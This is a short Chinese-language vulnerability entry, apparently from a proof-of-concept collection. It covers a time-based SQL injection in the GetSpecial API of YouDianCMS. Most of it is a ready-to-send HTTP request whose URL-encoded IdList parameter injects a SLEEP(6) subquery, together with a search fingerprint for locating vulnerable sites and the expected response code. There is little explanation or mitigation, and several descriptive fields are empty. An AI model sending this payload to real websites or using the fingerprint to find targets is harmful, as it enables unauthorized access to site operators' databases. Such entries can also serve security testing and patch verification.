﻿# YouDianCMS友点系统GetSpecial接口SQL延时注入漏洞

> 更新时间：2024-02-22

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：app="友点建站-CMS"

> 验证脚本：HTTP

```
GET /index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1%29%20and%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%286%29%29%29A HTTP/1.1
accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=din23h07blv026kk4tdqt1re00
Connection: close
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：YouDianCMS友点系统GetSpecial接口SQL延时注入漏洞.poc